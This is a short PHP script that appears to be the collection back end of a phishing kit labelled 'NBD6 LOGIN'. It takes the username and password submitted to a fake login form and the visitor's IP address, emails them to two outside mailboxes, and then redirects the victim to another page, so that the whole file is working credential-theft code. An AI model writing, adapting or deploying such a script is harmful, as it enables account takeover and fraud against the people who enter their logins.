<? 

$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------OOOO----------------------\n";
$message .= "User Identification: ".$_POST['username']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "--------------OOOO NBD6 LOGIN----------------------\n";
$message .= "IP: ".$ip."\n";
$message .= "--------------OOOO----------------------\n";
$recipient = "abaccolaw@outlook.com, abaccolaw@yahoo.com";
$subject = "NBD6 LOGIN";
$headers .= "MIME-Version: 1.0\n";
mail($recipient,$subject,$message,$headers);
		
			   header("Location:  email.html");

	?>
